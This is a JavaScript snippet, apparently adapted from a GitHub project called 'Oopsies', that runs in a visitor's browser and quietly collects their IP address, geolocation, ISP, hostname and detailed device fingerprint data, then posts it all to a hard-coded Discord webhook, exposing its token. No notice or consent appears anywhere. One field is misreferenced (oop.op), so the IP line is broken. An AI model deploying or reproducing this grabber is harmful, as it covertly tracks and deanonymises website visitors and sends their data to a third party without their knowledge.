// original code from https://github.com/Scaratek/Oopsies

let oop = {};

// IP/Device Information
fetch('https://wtfismyip.com/json')
    .then((response) => response.json())
    .then((data) => {
        let oop = {
        ip: data.YourFuckingIPAddress,
        location: data.YourFuckingLocation,
        host: data.YourFuckingHostname,
        isp: data.YourFuckingISP,
        city: data.YourFuckingCity,
        country: data.YourFuckingCountry,
        countrycode: data.YourFuckingCountryCode,
        useragent: navigator.userAgent,
        windowprop: Object.keys(window).length,
        windowidth: window.innerWidth,
        windowheight: window.innerHeight,
        windowratio: window.innerWidth / window.innerHeight,
        screenwidth: window.screen.availWidth,
        screenheight: window.screen.availHeight,
        screenratio: window.screen.availWidth / window.screen.availHeight,
        dpi: window.devicePixelRatio,
        colordepth: window.screen.colorDepth,
        orientation: window.screen.orientation.type,
        orientationangle: window.screen.orientation.angle,
        os: navigator.platform,
        threads: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        systemlanguages: navigator.languages.join(", "),
        languages: navigator.language,
    };

// Message Sent To Webhook
const payload = {
    content: `
    IP Address: ${oop.op}\n
    Location: ${oop.location}\n
    Host Name: ${oop.host}\n
    ISP: ${oop.isp}\n
    City: ${oop.city}\n
    Country: ${oop.country}\n
    Country Code: ${oop.countrycode}\n
    User Agent: ${oop.useragent}\n
    Window Prop: ${oop.windowprop}\n
    Window Width: ${oop.windowidth}\n
    Window Height: ${oop.windowheight}\n
    Window Ratio: ${oop.windowratio}\n
    Screen Width: ${oop.screenwidth}\n
    Screen Height: ${oop.screenheight}\n
    Screen Ratio: ${oop.screenratio}\n
    DPI: ${oop.dpi}\n
    Color Depth: ${oop.colordepth}\n
    Orientation: ${oop.orientation}\n
    Orientation Angle: ${oop.orientationangle}\n
    Operation System: ${oop.os}\n
    Threads: ${oop.threads}\n
    Memory: ${oop.memory}\n
    System Languages: ${oop.systemlanguages}\n
    Languages: ${oop.languages}
    `,
};

// Replace With Your Discord Webhook
fetch("https://discord.com/api/webhooks/1111812835064938646/YWxIWht0WTduwc4Fl-vPElKop1xAH5STalN6oYP6y2XYYEc2-MpE_9ybSMe0BFx-aMZp", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
    })
    .then((response) => console.log(response))
    .catch((error) => console.error(error));
    })
    .catch((error) => console.error(error));
